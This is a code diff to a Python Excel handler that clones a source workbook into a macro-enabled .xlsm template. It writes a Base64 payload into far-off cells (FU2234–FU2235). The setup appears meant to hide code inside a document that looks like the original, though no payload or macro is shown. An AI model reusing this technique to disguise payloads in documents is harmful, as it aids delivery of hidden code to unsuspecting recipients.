@@ -1,6 +1,9 @@
 import time
 import xlwings as xw
 import os
+
+from lxml.doctestcompare import OutputChecker
+
 from utils import CustomLogger
 
 
@@ -23,7 +26,6 @@ class ExcelHandler:
         self.wb_template = None
 
     def load_source(self) -> None:
-
         """
         Carica il file sorgente in formato .xlsx utilizzando xlwings.
         """
@@ -62,34 +64,30 @@ class ExcelHandler:
         Copia in maniera 1:1 il contenuto del file sorgente nel template.
         Utilizza le funzionalità native di copy-paste di Excel per preservare valori, formattazione,
         celle unite e altre proprietà.
-        TODO: DA MIGLIORARE
         """
         if not self.wb_source or not self.wb_template:
             self.logging.error("Assicurarsi che il file sorgente e il template siano caricati.")
             return
 
         try:
+            # Verifica che i fogli esistano (meglio di accedere direttamente a sheets[0])
+            if len(self.wb_source.sheets) == 0 or len(self.wb_template.sheets) == 0:
+                raise RuntimeError("Il workbook non contiene fogli sufficienti.")
             src_sheet = self.wb_source.sheets[0]
             tmpl_sheet = self.wb_template.sheets[0]
-            # Determina l'intervallo usato nel foglio sorgente
             used_range = src_sheet.used_range
-            # Copia l'intero intervallo e incolla nel template a partire da A1
             used_range.copy(destination=tmpl_sheet.range("A1"))
-            time.sleep(10)
             self.logging.info("Contenuto copiato in maniera 1:1 dal file sorgente al template.")
         except Exception as e:
             self.logging.error(f"Errore durante la copia del contenuto: {e}")
+        finally:
+            if self.wb_source:
+                self.wb_source.close()
 
     def write_payload_to_cells(self, payload_b64: str, start_row: int = 2234, finish_row: int = 2235,
                                start_column: int = 177) -> None:
         """
         Scrive il payload Base64 nelle celle specificate del template.
-        Il payload viene scritto a partire dalla cella (start_row, start_column) e si estende fino a finish_row.
-
-        :param payload_b64: Payload Base64 generato.
-        :param start_row: Riga di partenza (default: 2234).
-        :param finish_row: Riga di fine (default: 2235).
-        :param start_column: Colonna di partenza (default: 177).
         """
         try:
             tmpl_sheet = self.wb_template.sheets[0]
@@ -101,29 +99,28 @@ class ExcelHandler:
                 lines = lines[:available_rows]
             for i, part in enumerate(lines):
                 tmpl_sheet.cells(start_row + i, start_column).value = part
-                time.sleep(2)
-            self.logging.info("Payload inserito con successo nelle celle del template.")
+            self.logging.info(f"Payload inserito con successo nelle celle del template: FU2234-FU2235")
         except Exception as e:
-            self.logging.error(f"Errore durante l'inserimento del payload: {e}")
+            raise RuntimeError(f"Errore durante la copia del payload: {e}")
 
-    def save_workbook(self, save_as_new: bool = False) -> None:
+    def save_workbook(self) -> None:
         """
         Salva il workbook template modificato in formato .xlsm, preservando le macro.
-
-        :param save_as_new: Se True, chiede un nuovo nome di file.
         """
-
         try:
-            if save_as_new:
-                new_filename = input("Inserisci il nome del nuovo file (con estensione .xlsm): ")
-                if not new_filename.lower().endswith(self.extension_xlsm):
-                    self.logging.error(f"Il nuovo file deve avere estensione {self.extension_xlsm}.")
-                    return
-                output_filename = new_filename
-            else:
-                base, _ = os.path.splitext(self.filename)
-                output_filename = base + "_mod" + self.extension_xlsm
+            base, _ = os.path.splitext(self.filename)
+            output_filename = base + "_mod" + self.extension_xlsm
+            # Se il file esiste già, aggiungo un suffisso numerico per creare un nome univoco
+            counter = 1
+            new_filename = output_filename
+            while os.path.exists(new_filename):
+                new_filename = f"{base}_mod_{counter}{self.extension_xlsm}"
+                counter += 1
+            output_filename = new_filename
+            self.logging.info(f"La cartella contiene un file con lo stesso nome, viene salvato come {output_filename}")
+
             self.wb_template.save(output_filename)
+            self.wb_template.close()
             self.logging.info(f"File salvato come {output_filename}.")
         except Exception as e:
             self.logging.error(f"Errore durante il salvataggio del file: {e}")
